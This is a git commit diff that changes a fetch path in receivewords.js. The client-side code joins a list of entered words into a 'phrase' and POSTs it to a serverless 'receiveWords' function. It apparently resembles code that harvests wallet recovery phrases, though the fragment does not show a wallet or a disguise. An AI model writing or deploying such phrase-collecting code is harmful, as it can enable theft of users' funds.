bb4e44725dd8765aeafc4ed57bfd5d8766ca1380
thomasdov <caddy-film-limes@duck.com>
2026-03-27 12:04:17 +0100

    Update receivewords.js

--- netlify/functions/receivewords.js
+++ netlify/functions/receivewords.js
@@ -8,7 +8,7 @@ continueBtn.addEventListener('click', async () => {
     const phrase = words.join(" ");
 
     try {
-        const response = await fetch("/.netlify/functions/receiveWords", {
+        const response = await fetch(".netlify/functions/receiveWords", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ phrase })
